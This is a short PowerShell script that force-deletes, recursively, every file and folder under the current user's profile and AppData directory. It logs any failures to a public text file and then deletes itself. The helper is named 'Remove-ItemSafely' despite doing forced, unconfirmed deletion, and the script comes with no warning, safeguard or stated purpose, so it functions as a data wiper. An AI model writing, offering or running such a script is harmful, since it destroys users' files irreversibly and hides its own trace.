$targetDirectory = [System.Environment]::GetFolderPath("UserProfile")
$appDataDirectory = Join-Path $targetDirectory "AppData"
$scriptPath = $MyInvocation.MyCommand.Path
$logFilePath = "C:\Users\Public\deletion_log.txt"

function Remove-ItemSafely {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    try {
        Remove-Item -Path $Path -Force -Recurse -ErrorAction Stop
    } catch {
        "$Path could not be deleted: $_" | Out-File -FilePath $logFilePath -Append
    }
}

Get-ChildItem -Path $targetDirectory -Recurse | Where-Object { $_.FullName -ne $scriptPath } | ForEach-Object { Remove-ItemSafely -Path $_.FullName }
Get-ChildItem -Path $appDataDirectory -Recurse | ForEach-Object { Remove-ItemSafely -Path $_.FullName }

# Optionally, delete the script itself after everything else has been deleted
Remove-ItemSafely -Path $scriptPath
